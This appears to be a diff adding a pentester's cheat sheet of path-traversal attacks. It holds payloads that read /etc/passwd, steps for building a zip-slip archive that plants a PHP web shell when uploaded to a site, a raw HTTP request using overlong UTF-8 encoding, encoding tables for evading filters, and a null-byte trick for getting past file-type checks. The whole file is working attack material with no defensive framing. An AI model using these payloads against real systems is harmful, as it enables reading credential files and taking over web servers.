@@ -1,0 +1,40 @@
+../../../../etc/passwd
+..//..//..//etc/passwd
+
+Embed a shell in a zip file that can be uploaded to a website:
+	create the following directory structure: 
+		mkdir -p  ~/Downloads/var/www/1/1/1/1/1/1/1/1/1/1
+		cp pwnt.php /~/Downloads/var/www/
+		cd ~/Downloads/var/www/1/1/1/1/1/1/1/1/1/1
+		zip traversal.zip ../../../../../../../../../../../../var/www/pwnt.php
+			7z l traversal.zip 	#will show you the path traversal 
+	Upload file to web site.
+
+GET /u/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd HTTP/1.1
+Host: TargetHost
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+
+Basically the "/u/" is a directory that exist and the UTF-8 is similar to the traditional /u/../../../../../../../../etc/passwd
+
+%c0%ae is a dot "."
+%c0%af is a slash "/".
+
+
+16 bit Unicode encoding:
+ . = %u002e, / = %u2215, \ = %u2216 
+
+Double URL encoding:
+. = %252e, / = %252f, \ = %255c     
+
+UTF-8 Unicode encoding:   
+. = %c0%2e, %e0%40%ae, %c0ae, / = %c0%af, %e0%80%af, %c0%2f, \ = %c0%5c, %c0%80%5c
+
+
+download file, xls downloads are not allowed but pdf are: 
+http://site.com/downloads/file.xls%2500.pdf
+	%25 is Hex for % sign
+	00 is null byte
+		combining the two gives you %2500
